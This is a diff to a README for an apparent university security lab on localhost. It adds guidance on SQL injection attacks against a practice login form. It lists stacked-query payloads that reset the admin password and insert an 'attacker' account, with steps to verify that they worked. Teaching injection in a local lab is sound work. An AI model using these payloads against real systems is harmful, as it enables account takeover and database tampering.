@@ -85,14 +85,24 @@ Then access: **http://localhost/sns_lab5/secure_app/**
 - **Effect:** Infer database contents without extracting data directly
 
 ### Attack 4 — Database Modification (MANDATORY)
+
+> **⚠️ Important Note:** Database modification attacks will show **"Login failed"** on the
+> initial attempt. This is expected — the injected SQL (UPDATE / INSERT / DELETE) still
+> executes in the background via a stacked query, but the login query itself does not
+> return a valid user row. **To verify the attack worked**, try logging in again with
+> the modified credentials (e.g. `admin` / `hacked`) or check the `users` table in
+> phpMyAdmin.
+
 #### Change admin password:
 - **Username:** `'; UPDATE users SET password='hacked' WHERE username='admin' -- `
 - **Password:** `anything`
+- **Verify:** After seeing "Login failed", log in again with `admin` / `hacked` — it should succeed, proving the password was changed.
 - *(Requires taking screenshot before and after)*
 
 #### Insert new user:
 - **Username:** `'; INSERT INTO users (username, password) VALUES ('attacker','evil') -- `
 - **Password:** `anything`
+- **Verify:** After seeing "Login failed", log in with `attacker` / `evil` — it should succeed, proving the account was inserted.
 
 ---
 
